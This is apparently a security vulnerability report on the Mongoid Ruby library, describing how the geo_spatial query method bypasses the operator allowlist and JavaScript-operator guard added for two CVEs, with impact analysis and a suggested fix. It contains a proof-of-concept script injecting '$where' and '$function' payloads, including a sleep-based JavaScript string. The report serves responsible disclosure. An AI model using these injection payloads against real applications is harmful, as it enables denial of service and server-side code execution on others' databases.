# Title

Mongoid — `Selectable#geo_spatial` merges a raw criterion hash via `__merge__`/`__expr_part__`, entirely bypassing the operator-allowlist and `$where`/`$function`/`$accumulator` depth guard added for CVE-2026-93759/93760, in `v9.1.1`

## Status note / scope

Third finding from sibling-hunting the same CVE batch via fix commit `91cc55dacfb68339b50628b489626f8319fd21b1` on `mongodb/mongoid` `v9.1.1`, after the atomic-operation `send(field)` report and the `embeds_many` encryption-schema report. This one is specifically about CVE-2026-93759 (string criteria → `$where`) and CVE-2026-93760 (unsafe-by-default operator allowlist), whose fix commit message says the new guard was moved into `_mongoid_expand_keys` "the one point every user-supplied expression passes through." That claim is true for `where`/`find_by`/`and`/`or`/`nor`/`not`/`any_of`/`none_of`/`elem_match` — I traced each one. It is not true for `Selectable#geo_spatial`.

## Summary

`Selectable#geo_spatial` (`lib/mongoid/criteria/queryable/selectable.rb:206-213`) takes a `Hash` criterion and merges it via `__merge__`:

```ruby
def geo_spatial(criterion)
  raise Errors::CriteriaArgumentRequired, :geo_spatial if criterion.nil?
  __merge__(criterion)
end
```

`__merge__` (`lib/mongoid/criteria/queryable/mergeable.rb:109-121`) does **not** call `_mongoid_expand_keys` — the exact function the fix commit made the sole enforcement point for `ALLOWED_QUERY_OPERATORS`/`JAVASCRIPT_QUERY_OPERATORS`. Instead it goes through a separate, older code path:

```ruby
def __merge__(criterion)
  selection(criterion) do |selector, field, value|
    selector.merge!(field.__expr_part__(value))
  end
end
```

`selection` (`selectable.rb:981-989`) just iterates the hash and yields each `field`/`value` pair; for a plain String key (not a `Key`-wrapped symbol operator like `:location.within_box`), `String#__expr_part__` (`lib/mongoid/criteria/queryable/extensions/string.rb:79-83`) does:

```ruby
def __expr_part__(key, value, negating = false)
  ...
  { key => value }   # <-- verbatim pass-through, no operator check
end
```

So `Model.geo_spatial('$where' => js)` merges `{'$where' => js}` straight into the selector with zero validation — not the top-level allowlist, not the any-depth `$where`/`$function`/`$accumulator` rejection, nothing. `geo_spatial` is a normal forwardable `Selectable` method (exposed at the model class level exactly like `where`/`find_by`), so this is reachable from application code the same way the already-fixed methods are.

I checked every other private merge helper in `mergeable.rb` (`__add__`, `__intersect__`, `__union__`, `__override__`, `with_strategy`, `__expanded__`) — all of them take the MongoDB operator as a **separate, hardcoded parameter** supplied by the calling named method (e.g. `def gt(criterion)` always passes `'$gt'`), so a caller can control `field`/`value` but never the operator itself through those. `__merge__` is the only one where the *criterion hash's own keys* become top-level operators with no allowlist check, and `geo_spatial` is the only caller of `__merge__` in the entire `lib/` tree.

## Live PoC — executed, not traced

Same `v9.1.1` checkout, `bundle exec ruby`, no MongoDB server needed (this only inspects the built `Criteria#selector`, it doesn't execute the query against a server):

```ruby
require 'mongoid'

class Place
  include Mongoid::Document
  field :name, type: String
end

puts "Mongoid::VERSION = #{Mongoid::VERSION}"
puts "Mongoid.allow_unsafe_query_operators? = #{Mongoid.allow_unsafe_query_operators?}"
puts

puts "--- Baseline: where('$where' => '...') is correctly rejected ---"
begin
  Place.where('$where' => 'sleep(9999)||true')
  puts "no exception (unexpected)"
rescue Mongoid::Errors::InvalidQuery => e
  puts "Raised as expected: #{e.class}"
end

puts
puts "--- geo_spatial('$where' => '...') ---"
begin
  crit = Place.geo_spatial('$where' => 'sleep(9999)||true')
  puts "NO EXCEPTION RAISED."
  puts "Resulting selector: #{crit.selector.inspect}"
rescue => e
  puts "Raised: #{e.class}: #{e.message}"
end

puts
puts "--- Same bypass via $function at any depth through geo_spatial ---"
begin
  crit2 = Place.geo_spatial('$function' => { 'body' => 'function() { return true; }', 'args' => [], 'lang' => 'js' })
  puts "NO EXCEPTION RAISED."
  puts "Resulting selector: #{crit2.selector.inspect}"
rescue => e
  puts "Raised: #{e.class}: #{e.message}"
end
```

**Actual, complete, unedited output:**
```
Mongoid::VERSION = 9.1.1
Mongoid.allow_unsafe_query_operators? = false

--- Baseline: where('$where' => '...') is correctly rejected ---
Raised as expected: Mongoid::Errors::InvalidQuery

--- geo_spatial('$where' => '...') ---
NO EXCEPTION RAISED.
Resulting selector: {"$where"=>"sleep(9999)||true"}

--- Same bypass via $function at any depth through geo_spatial ---
NO EXCEPTION RAISED.
Resulting selector: {"$function"=>{"body"=>"function() { return true; }", "args"=>[], "lang"=>"js"}}
```

With the exact same global configuration (`allow_unsafe_query_operators? == false`, the secure v9.1.1 default) under which `where('$where' => ...)` is correctly rejected one line earlier, `geo_spatial('$where' => ...)` builds a `Criteria` whose `.selector` is `{"$where"=>"sleep(9999)||true"}` verbatim. Calling any query-executing method on that `Criteria` (`.first`, `.to_a`, `.count`, ...) sends that selector to `find` on the server exactly as it would for a `where` call, except no guard ever ran.

## Impact

Identical impact to CVE-2026-93759/93760, reached through a different `Selectable` method:
- **Server-side JavaScript execution** (`$where`, `$function`, `$accumulator`) with data the application forwarded into `geo_spatial`, same as the now-fixed `where`/`and`/`or` paths.
- **Unrestricted operator pass-through** generally — since `__merge__` never even runs `ALLOWED_QUERY_OPERATORS`, not just the JS-specific operators, any `$`-prefixed key survives, restoring the pre-fix "any operator, unrestricted" behavior CVE-93760 was about, for this one method.

## Threat model / reachability

Same as the parent CVEs: an application that forwards externally-supplied filter parameters into a Mongoid query-building method. `geo_spatial` is a narrower, less commonly-used API than `where`/`find_by` — it's meant for `$geoIntersects`/`$geoWithin` queries built from symbol-operator keys like `:location.within_box`. But nothing about its signature restricts it to that use: it accepts any Hash, and an application that builds geospatial search endpoints (a common pattern: "find places near me matching these filters") and forwards caller-supplied hash data into it — the same unremarkable pattern that made the sibling `where`-based CVEs worth filing — is fully exposed. I'm not aware of anything that makes `geo_spatial` less reachable from untrusted input than `where` was before its fix.

## Weakness

CWE-943 (Improper Neutralization of Special Elements in Data Query Logic) / CWE-95 (Server-Side JS Injection) — identical classification to CVE-93759/93760, reached through a merge path the fix commit's guard placement didn't cover.

## Component / Version

- Repository: `mongodb/mongoid`
- Confirmed present on `v9.1.1` (commit `381d954edf3812f138e53b940123126619713a03`)
- Confirmed reproducible with `Mongoid.allow_unsafe_query_operators?` at its new, secure `v9.1.1` default (`false`)
- Files: `lib/mongoid/criteria/queryable/selectable.rb:206-213` (`geo_spatial`), `lib/mongoid/criteria/queryable/mergeable.rb:109-121` (`__merge__`, the merge path with no `_mongoid_expand_keys` call), `lib/mongoid/criteria/queryable/extensions/string.rb:79-83` (`String.__expr_part__`, the verbatim pass-through)

## Suggested fix

Route `__merge__` through `_mongoid_expand_keys` the same way `expr_query`/`__multi__`/`_mongoid_add_top_level_operation` already do, e.g.:

```ruby
def __merge__(criterion)
  clone.tap do |query|
    normalized = _mongoid_expand_keys(criterion)
    query.selector.merge!(normalized)
    query.reset_strategies!
  end
end
```

(adjusted as needed to preserve `geo_spatial`'s existing `Key`-object handling for `:location.within_box`-style calls) so that the same allowlist and any-depth JavaScript-operator rejection the commit already applies everywhere else also covers this entry point.

## Notes on scope

Found by tracing every caller of `_mongoid_expand_keys` and cross-checking it against every method that accepts a raw criterion Hash in `Selectable`/`Mergeable`, specifically to verify the fix commit's own claim that `_mongoid_expand_keys` is "the one point every user-supplied expression passes through." `geo_spatial`/`__merge__` was the one path that doesn't. Confirmed live against the unmodified gem rather than asserted from reading alone.
